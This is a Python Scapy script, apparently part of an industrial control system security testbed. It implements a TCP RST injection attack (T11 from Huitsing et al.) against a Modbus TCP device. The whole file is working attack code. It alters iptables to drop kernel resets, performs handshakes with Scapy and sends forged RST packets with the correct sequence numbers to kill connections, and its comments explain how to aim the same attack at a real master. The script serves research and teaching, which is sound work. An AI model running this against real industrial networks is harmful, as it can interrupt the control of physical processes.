"""
T11 - TCP RST Flood
Scapy performs the full TCP handshake directly (bypassing the OS TCP stack),
then injects an RST with the exact sequence number to instantly terminate the
Modbus connection. No authentication or sequence-number integrity check in
Modbus TCP prevents this.

In a real attack with network-level access (e.g., via ARP poisoning or a port
mirror), the same RST would target the legitimate master's persistent connection,
causing repeated poll failures until reconnection.

An iptables rule suppresses the kernel's automatic RST responses to the
SYN-ACK packets received by Scapy (required when bypassing the OS TCP stack).

Reference: Huitsing et al. (2008), attack T11
Threat type: Interruption
Target assets: Master (T11-1), Field device (T11-2), Network path (T11-3)
"""

import os
import random
import struct
import time

from scapy.all import IP, TCP, Raw, sr1, send, conf

SLAVE_IP      = "172.20.0.2"
SLAVE_PORT    = 502
ATTACK_CYCLES = 8
CYCLE_DELAY   = 0.5

conf.verb = 0

# Suppress kernel RST responses to Scapy-owned SYN-ACKs.
# Without this rule the OS TCP stack would RST every SYN-ACK it receives for
# connections it didn't open, which would race with Scapy's ACK and tear down
# the handshake. The rule is a no-op if iptables is not installed (slim image).
os.system("iptables -A OUTPUT -p tcp --tcp-flags RST RST -d 172.20.0.2 -j DROP")

print("[T11] TCP RST Flood — injecting RST packets into Modbus TCP connections")
print("[T11] Modbus TCP has no sequence-number integrity check or session token\n")

success = 0

for cycle in range(1, ATTACK_CYCLES + 1):
    src_port = random.randint(40000, 59000)
    isn      = random.randint(10000, 99999)

    # ── 3-way handshake (Scapy controls sequence numbers) ─────────────────────
    syn     = IP(dst=SLAVE_IP) / TCP(sport=src_port, dport=SLAVE_PORT,
                                      flags="S", seq=isn)
    syn_ack = sr1(syn, timeout=3, verbose=0)
    if syn_ack is None:
        print(f"[T11] Cycle {cycle}: no SYN-ACK — skipping")
        continue

    ack = IP(dst=SLAVE_IP) / TCP(sport=src_port, dport=SLAVE_PORT,
                                  flags="A", seq=isn + 1,
                                  ack=syn_ack[TCP].seq + 1)
    send(ack)

    # ── Modbus FC03 request ────────────────────────────────────────────────────
    mbap = struct.pack(">HHHBB", cycle, 0, 6, 1, 3) + struct.pack(">HH", 0, 5)
    data_pkt = (
        IP(dst=SLAVE_IP)
        / TCP(sport=src_port, dport=SLAVE_PORT, flags="PA",
              seq=isn + 1, ack=syn_ack[TCP].seq + 1)
        / Raw(load=mbap)
    )
    sr1(data_pkt, timeout=2, verbose=0)

    # ── Inject RST with the correct next sequence number ──────────────────────
    rst_seq = isn + 1 + len(mbap)
    rst = IP(dst=SLAVE_IP) / TCP(sport=src_port, dport=SLAVE_PORT,
                                  flags="R", seq=rst_seq)
    send(rst)

    print(f"[T11] Cycle {cycle:2d}: src_port={src_port}  RST injected at seq={rst_seq}"
          f"  → connection terminated")
    success += 1
    time.sleep(CYCLE_DELAY)

# Restore iptables
os.system("iptables -D OUTPUT -p tcp --tcp-flags RST RST -d 172.20.0.2 -j DROP")

print(f"\n[T11] {success}/{ATTACK_CYCLES} Modbus connections terminated by RST injection.")
print("[T11] Modbus has no mechanism to detect or prevent forged RST packets.")
print("[T11] In a real environment, the same technique targets the master's")
print("[T11] persistent connection, causing repeated poll failures.")
